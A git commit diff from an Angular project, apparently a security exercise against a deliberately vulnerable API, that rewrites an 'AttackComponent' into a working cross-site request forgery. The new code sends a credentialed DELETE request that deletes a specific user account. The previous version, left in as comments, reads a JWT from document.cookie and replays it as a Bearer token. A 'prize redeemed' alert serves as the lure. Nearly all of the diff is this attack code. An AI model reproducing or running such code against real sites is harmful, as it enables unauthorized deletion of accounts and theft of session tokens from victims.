dbba1929600bb8ad82131efbb99d35c4630f71b4
luzivangois <luzivangois@outlook.com>
2025-02-07 11:46:29 -0300

    tentativa de ataque sem ler o cookie

--- src/app/attack/attack.component.ts
+++ src/app/attack/attack.component.ts
@@ -10,24 +10,34 @@ export class AttackComponent {
   constructor(private http: HttpClient) {}
 
   attack() {
-    // Busca o token JWT armazenado no cookie vulnerável
-    const token = document.cookie
-      .split('; ')
-      .find(row => row.startsWith('auth-token='))
-      ?.split('=')[1];
+    this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
+      withCredentials: true
+    }).subscribe({
+      next: () => alert('Ataque CSRF realizado com sucesso!'),
+      error: (err) => console.error('Erro no ataque CSRF:', err)
+    });
+  }
   
-    if (token) {
-      const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
+
+  // attack() {
+  //   // Busca o token JWT armazenado no cookie vulnerável
+  //   const token = document.cookie
+  //     .split('; ')
+  //     .find(row => row.startsWith('auth-token='))
+  //     ?.split('=')[1];
   
-      this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
-        headers,
-        withCredentials: true  // Garante o envio do cookie em requisições cross-site
-      }).subscribe({
-        next: () => alert('Prêmio resgatado com sucesso!'),
-        error: (err) => console.error('Erro no ataque CSRF:', err)
-      });
-    } else {
-      console.error('Token JWT não encontrado nos cookies.');
-    }
-  }  
+  //   if (token) {
+  //     const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
+  
+  //     this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
+  //       headers,
+  //       withCredentials: true  // Garante o envio do cookie em requisições cross-site
+  //     }).subscribe({
+  //       next: () => alert('Prêmio resgatado com sucesso!'),
+  //       error: (err) => console.error('Erro no ataque CSRF:', err)
+  //     });
+  //   } else {
+  //     console.error('Token JWT não encontrado nos cookies.');
+  //   }
+  // }  
 }
